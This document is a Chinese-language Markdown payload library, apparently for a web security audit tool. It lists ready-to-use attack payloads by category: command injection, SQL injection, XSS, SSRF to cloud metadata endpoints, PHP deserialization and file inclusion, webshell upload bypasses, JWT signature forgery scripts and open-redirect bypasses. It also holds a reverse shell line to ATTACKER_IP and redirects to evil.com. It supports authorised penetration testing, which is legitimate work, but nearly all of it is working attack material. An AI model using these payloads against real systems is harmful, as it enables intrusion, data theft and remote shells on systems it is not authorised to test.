# Payload 模板库

分类整理的攻击 Payload，供 Phase 4 审计器参考。配合 `tools/payload_encoder.php` 使用编码变体。

---

## RCE Payload

### 命令执行探测
```
id
whoami
cat /etc/passwd
echo PROOF_$(date +%s) > /tmp/rce_proof
```

### 命令分隔符
```
;id
|id
||id
&id
&&id
`id`
$(id)
%0aid
```

### PHP 代码执行
```php
phpinfo();
system('id');
echo shell_exec('whoami');
print_r(file_get_contents('/etc/passwd'));
```

### PHP Filter Chain (LFI→RCE)
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp
```

---

## SQL 注入 Payload

### 探测
```sql
'
"
' OR '1'='1
' OR '1'='1'--
1' AND 1=1--
1' AND 1=2--
```

### UNION 注入
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

### 时间盲注
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--
' AND pg_sleep(5)--
```

### 报错注入
```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

---

## XSS Payload

### 基础标签
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### 无括号执行
```html
<img src=x onerror=alert`1`>
<svg onload=location='javascript:alert(1)'>
```

### 编码变体
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

---

## SSRF Payload

### 内网探测
```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0/
http://2130706433/
http://0x7f000001/
```

### 云元数据
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 反序列化 Payload

### PHP 基础
```
O:8:"stdClass":0:{}
O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}
```

### __wakeup 绕过 (CVE-2016-7124)
```
O:4:"Test":2:{...}  → 改为 O:4:"Test":3:{...}
```

---

## 文件包含 Payload

### 基础遍历
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### PHP 协议
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST body: <?php system('id'); ?>)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

## NoSQL Payload

### MongoDB 操作符注入
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

---

## 文件上传 Payload

### 扩展名绕过
```
shell.php.jpg
shell.pHp
shell.phtml
shell.php5
shell.phar
shell.php%00.jpg
```

### 文件头伪装
```
GIF89a<?php system($_GET['cmd']); ?>
```

---

## PHP Type Juggling Payload

PHP 弱类型比较（`==`）导致的各种绕过，实战中常见于登录、密码重置、验证码校验等场景。

### Magic Hash（MD5 碰撞 `0e` 开头）

以下字符串的 MD5 值均以 `0e` 开头，PHP `==` 比较时被当作科学计数法，值为 `0`：

```
# MD5 magic hash — 互相 == 成立
240610708      → md5: 0e462097431906509019562988736854
QNKCDZO        → md5: 0e830400451993494058024219903391
aabg7XSs       → md5: 0e087386482136013740957780965295
aabC9RqS       → md5: 0e041022518165728065344349536617
```

SHA1 同理：
```
# SHA1 magic hash
aaroZmOk       → sha1: 0e66507019969427134894567494305185566735
aaK1STfY       → sha1: 0e76658526655756207688271159624026011393
```

利用方式（登录绕过示例）：
```php
// 漏洞代码: if (md5($input) == md5($stored_password))
// 攻击: 让两端 md5 都是 0e 开头即可
```

### JSON 整数 0 / 数组 [] 绕过

PHP 中 `0 == "any_string"` 为 `true`（PHP 7 以下），JSON 传入整数可绕过字符串比较：

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":0}
```

数组绕过（使某些函数返回 `NULL`，`NULL == false` 为真）：
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":[]}
```

### strcmp 数组绕过

`strcmp(array(), "string")` 在 PHP < 8.0 返回 `NULL`，`NULL == 0` 为 `true`：

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=xxx
```

```php
// 漏洞代码: if (strcmp($_POST['password'], $real_password) == 0)
// strcmp 收到数组参数 → 返回 NULL → NULL == 0 → true → 绕过
```

### in_array 松散比较绕过

`in_array()` 默认使用松散比较，整数 `0` 与任意非数字开头的字符串相等：

```php
// 漏洞代码
$whitelist = ['admin', 'editor', 'viewer'];
if (in_array(0, $whitelist)) {
    // 始终为 true，因为 0 == 'admin' → true
}

// 安全写法: in_array($input, $whitelist, true)  // 第三个参数 strict=true
```

---

## JWT 攻击 Payload

针对 JSON Web Token 实现缺陷的攻击 payload 集合。

### Algorithm None 攻击

将 `alg` 设为 `none` 并移除签名部分，绕过签名验证：

```
# 原始 JWT header
{"alg":"HS256","typ":"JWT"}

# 篡改后 header（base64url 编码前）
{"alg":"none","typ":"JWT"}

# 编码后 header
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# 完整 payload 示例（注意末尾的点，签名为空）
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

变体（某些库对 `none` 大小写敏感）：
```
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### RS256 → HS256 算法混淆

服务端用 RSA 公钥验签，攻击者将算法改为 HS256，用公钥作为 HMAC 密钥签名：

```bash
# 1. 获取目标的 RSA 公钥（通常从 /jwks.json 或 /.well-known/jwks.json）
# 2. 用公钥作为 HS256 secret 签名

# python3 示例
import jwt
import json

public_key = open('public.pem', 'r').read()

payload = {
    "sub": "1234567890",
    "user": "admin",
    "role": "administrator",
    "iat": 1516239022
}

# 关键: 用 RSA 公钥作为 HS256 的密钥
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

### JWK Header 注入

在 JWT header 中嵌入自己的 JWK 公钥，服务端如果信任 header 中的 key 就会用攻击者的密钥验证：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<攻击者的RSA公钥模数>",
    "e": "AQAB",
    "kid": "attacker-key-1"
  }
}
```

### KID Path Traversal

`kid`（Key ID）参数如果被用于文件读取，可通过路径穿越指向已知内容的文件：

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
```

`/dev/null` 内容为空，因此 HMAC 密钥为空字符串：
```bash
# 用空字符串作为 secret 签名
python3 -c "
import jwt
token = jwt.encode({'user':'admin','role':'admin'}, '', algorithm='HS256')
print(token)
"
```

其他 KID traversal 路径：
```
"kid": "../../../etc/hostname"
"kid": "../../../proc/sys/kernel/hostname"
"kid": "../../../../../../dev/null"
```

---

## PHP 文件包含 Payload

PHP `include/require` 配合各种协议流的高级利用技巧。

### php://filter 完整链

基础 base64 读源码：
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=/etc/passwd
```

iconv 编码链（绕过 WAF 或读取二进制文件）：
```
php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
php://filter/convert.iconv.UTF-8.CSISO2022KR/resource=index.php
```

zlib 压缩链：
```
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/zlib.inflate/resource=data:;base64,<compressed_b64_payload>
```

组合链（多重编码绕过检测）：
```
php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|convert.base64-encode/resource=index.php
php://filter/string.rot13/convert.base64-encode/resource=index.php
```

### data:// 协议 RCE

直接在 URL 中嵌入 PHP 代码执行（需 `allow_url_include=On`）：

```
data://text/plain,<?php system($_GET['c']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

完整 HTTP 请求示例：
```http
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id HTTP/1.1
Host: target.com
```

常用 base64 payload 对照表：
```
<?php system($_GET['c']); ?>           → PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
<?php phpinfo(); ?>                     → PD9waHAgcGhwaW5mbygpOyA/Pg==
<?php echo file_get_contents('/etc/passwd'); ?> → PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKTsgPz4=
```

### phar:// 反序列化触发

通过 `phar://` 协议触发 PHP 反序列化，无需 `unserialize()` 函数：

```
phar://uploads/avatar.jpg/test.txt
phar://uploads/shell.phar/anything
phar:///tmp/malicious.phar/dummy
```

触发点（以下函数均可触发 phar 反序列化）：
```php
file_exists('phar://...')
file_get_contents('phar://...')
is_dir('phar://...')
fopen('phar://...')
stat('phar://...')
md5_file('phar://...')
filemtime('phar://...')
```

### expect:// RCE

需要 `expect` 扩展已安装启用（较少见，但一旦存在即可直接执行命令）：

```
expect://id
expect://whoami
expect://cat+/etc/passwd
expect://bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

```http
GET /index.php?page=expect://id HTTP/1.1
Host: target.com
```

---

## Open Redirect 绕过 Payload

针对 URL 重定向白名单/黑名单校验的各种绕过技巧。

### 协议相对路径绕过

利用浏览器对 `//` 开头 URL 的解析行为：
```
//evil.com
///evil.com
////evil.com
/\/evil.com
/\evil.com
```

### 反斜杠绕过

某些服务器/框架将 `\` 视为路径分隔符：
```
\evil.com
\/\/evil.com
/\evil.com
```

### CRLF 注入重定向

通过 HTTP header 注入插入 `Location` 头：
```
%0d%0aLocation:%20http://evil.com
%0d%0aLocation:%0d%0a%0d%0a<script>alert(1)</script>
%E5%98%8A%E5%98%8DLocation:%20http://evil.com
```

URL 编码变体：
```
%0aLocation:%20http://evil.com
%0dLocation:%20http://evil.com
```

### @ 符号绕过

浏览器将 `@` 前面的部分视为用户名（userinfo），实际访问 `@` 后面的域名：
```
https://target.com@evil.com
https://target.com%40evil.com
https://target.com:80@evil.com
https://target.com%00@evil.com
```

完整 HTTP 请求示例：
```http
GET /redirect?url=https://target.com@evil.com HTTP/1.1
Host: target.com
```

### 域名混淆绕过

利用 URL 解析差异和域名拼接技巧：
```
https://evil.com/.target.com
https://evil.com%23.target.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
```

### 特殊字符 / 编码绕过

```
/%09/evil.com
/%2fevil.com
/evil%2ecom
/.evil.com
/%68%74%74%70%73%3a%2f%2fevil.com
```

### 综合利用 Checklist

```
# 基础测试
/redirect?url=//evil.com
/redirect?url=https://evil.com
/redirect?url=/\evil.com

# @ 绕过
/redirect?url=https://target.com@evil.com
/redirect?url=//target.com@evil.com

# 域名混淆
/redirect?url=https://evil.com/.target.com
/redirect?url=https://target.com.evil.com

# 编码绕过
/redirect?url=%2f%2fevil.com
/redirect?url=https:%2f%2fevil.com
```
